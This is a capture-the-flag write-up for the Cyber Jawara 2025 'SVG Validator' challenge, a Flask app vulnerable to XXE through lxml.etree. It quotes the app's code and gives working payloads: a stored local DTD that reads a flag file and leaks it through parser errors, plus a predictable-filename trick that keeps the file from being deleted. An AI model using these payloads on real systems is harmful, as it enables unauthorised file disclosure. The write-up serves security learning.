---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466TG66IGEA%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T091634Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDEaCXVzLXdlc3QtMiJHMEUCIQCJw4TBZPozILHa2H4wJNmi1Na2zWD7qJ6eTRX2CR3jZgIgCDW2Jm6T%2FD7CbML%2Fz5iQChkzywk6jUq%2BK6jJ1eL%2Bu8IqiAQI6v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDFJVSoQ5N3H38T8ciyrcA8A1yvmvSwlLepUi%2FAeZfbWD86VIsVQWNXZmp9XkrI34ditVDO%2BrSVhvzJ2Jr8fEX1wEbRtKCZr7eujhmBVuE5AVkcCCzMMiiy36dEClArA67BV9FtWHeuC2ksIJMHZV7J99Cy5MriK1Ok14yj%2FmxCLoWgfRc40zmnq5zNSuA6yO4I2H9zOFySkUk69Jkz35aLZ8BNjmuJwZyUH2azlluUT88G%2FMCwijahXjDOtPxWlDi4%2B0p4db%2BENQh08l11T0nzJyrA557xAsBT0kDOq1foCy5wWsP7M14LX7hz4b%2FU6wjx1dbHQOBkNxpEAepdu0aX8juzzCql3BpyGbJPN7wooMAoPu%2BjE0NjhnPnApbyOOOytuPmGrBc5tqWO3qY10nxS5p8oq71gSH8Ttv276uNwcVDCRwIajLqNU%2FTTf%2BPW6fvc5t1COjGpVNv3k0qY6cStCDiauO6Pzok0qaye%2BDNklvC0J%2FS4oTKlJ4YigbPe6heyWirlSS9EZc4kI7fJGSwgbvhWlCUuVPxU8Zz1FiN0TbVrwc%2FfEjuCPFW8MTe7bV6vbL86Pfl0MsGuScDeKw39sP8faI89JT0fj8rEnkzNc91uYPENKinJK3RiNJ%2Br8%2FB%2FmjgrX9StgBjRIMMDxwMEGOqUBytW1qH7TuukeqLGlrSqk1Z%2BESelETkb9pfGybzxWxL7RACiItD%2Favu11EOlh9pMXKj5SSPi%2Fv4NCcAWuxCLuYDQwcWl3Z3aVPzpi7IKOa2GSwYncW9JhZ%2BKQqFrak7095uiVR57ekDWYnc1mY7rSKiBDKMHf%2FW7lx6AhN3IM%2FXRYHr9xE4Yx1C8FS1Jytg6pNW%2F0s3M8BPBuZL07Dbw5oAc31BGJ\&X-Amz-Signature=0400ac9ffe42e9f201a5c0b4699570efdfab866a754b80bfea658335c9d2ed24\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
